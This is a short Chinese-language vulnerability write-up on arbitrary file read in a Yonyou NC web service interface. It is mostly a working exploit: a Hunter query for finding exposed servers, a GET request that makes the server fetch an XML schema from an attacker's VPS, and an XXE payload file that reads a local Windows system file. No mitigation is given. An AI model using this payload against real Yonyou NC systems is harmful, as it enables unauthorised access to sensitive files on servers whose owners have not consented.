# 用友-NC-nc.itf.bd.crm.IPsndocExportToCrmService 接口存在任意文件读取

## 漏洞描述
用友NC nc.itf.bd.crm.IPsndocExportToCrmService 接口存在任意文件读取,攻击者可通过此漏洞获取敏感信息。

## 漏洞复现
1、Hunter

app.name="用友 UFIDA NC"

#### poc
```plain
GET /uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://vps/win.xml HTTP/1.1
Host:

```

需要vps开启一个http服务，然后新建Win.xml内容如下

```plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY winIni SYSTEM "file:///C:/Windows/win.ini">
]>
<data>
  <content>&winIni;</content>
</data>

```
